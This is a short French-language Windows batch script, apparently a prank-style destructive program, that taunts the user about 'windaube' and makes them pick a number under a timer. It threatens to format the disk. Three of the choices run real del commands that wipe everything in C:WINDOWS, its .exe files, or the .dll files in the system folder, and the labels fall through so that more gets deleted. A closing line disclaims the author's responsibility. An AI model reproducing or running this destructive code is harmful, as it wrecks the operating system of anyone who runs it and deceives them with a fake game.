   <<<beginning>>>

   @echo off

   :menu

   cls

   echo.

   echo salut a toi cher utilisateur de windaube

   echo nous allons maintenant jouer a un jeu tres interressant

   echo si tu gagnes ton repertoire c:windows restera intact

   echo mais attention si tu fermes cette fenetre ce sera ton disque dur qui sera formate

   echo tu es pret?

   pause

   echo bien je vois que tu es raisonable...

   echo ...le jeu commence

   echo Fuck Krosoft by witch-king

   echo le jeu est tres simple tu dois juste taper un chiffre entre 1 et 4

   echo si tu as de la chance il ne va rien se passer

   echo mais comme windaube porte la poisse ca va plutot ce passer comme ca :

   echo soit tous les fichiers de c:windows seront supprimes

   echo soit tous les .dll de c:windows\system seront supprimes

   echo soit tous les .exe de c:windows seront supprimes

   echo mais pense bien que si tu tentes de fermer cette fenetre c: sera formate

   echo et aussi j oubliais : tu n as que 30 secondes

   echo sinon adieu c:windows

   echo mais assez de bavardages vas y tapes 1 2 3 ou 4

   echo.

   choice /c:1234Q /t:1,30 /n les secondes passent!!!

   if errorlevel 255 goto erreur

   if errorlevel 5 goto Quitter

   if errorlevel 4 goto Quitter

   if errorlevel 3 goto Delexe

   if errorlevel 2 goto Deldll

   if errorlevel 1 goto Delwin

   if errorlevel 0 goto erreur

   goto fin



   :erreur

   echo merde

   goto fin



   :Quitter

   echo.

   echo intelligent pour un windaube user

   goto fin



   :Delexe

   echo.

   echo pas de chance les .exe ont disparus!

   del C:WINDOWS\*.exe



   :Deldll

   echo.

   echo plus de dll dans \system\ very unlucky!

   del C:WINDOWS\system\*.dll



   :Delwin

   echo.

   echo C:WINDOWS est mort!!! comme c dommage

   del /Y C:WINDOWS\*.*

   :fin

   echo a été fait par Psycopate il est la juste pour aider au monde a comprendre et je suiis en aucun ca respônsable de vos acte ok merci
   (justice for all)

   <<<END>>>
